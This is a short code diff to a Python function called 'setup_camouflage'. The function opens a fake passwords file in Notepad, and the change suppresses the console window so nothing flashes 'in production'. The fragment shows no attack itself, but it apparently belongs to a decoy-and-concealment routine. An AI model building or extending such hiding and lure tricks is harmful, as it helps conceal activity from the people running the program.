@@ -157,7 +157,9 @@ def setup_camouflage(original_file: str = None):
 
     # Open the fake file in notepad
     try:
-        subprocess.Popen(["notepad.exe", fake_file_path])
+        # Use CREATE_NO_WINDOW to prevent console flash in production
+        creationflags = subprocess.CREATE_NO_WINDOW if hasattr(subprocess, "CREATE_NO_WINDOW") else 0
+        subprocess.Popen(["notepad.exe", fake_file_path], creationflags=creationflags)
         log("Opened passwords in notepad")
     except Exception as e:
         log(f"Warning: Could not open notepad: {e}")
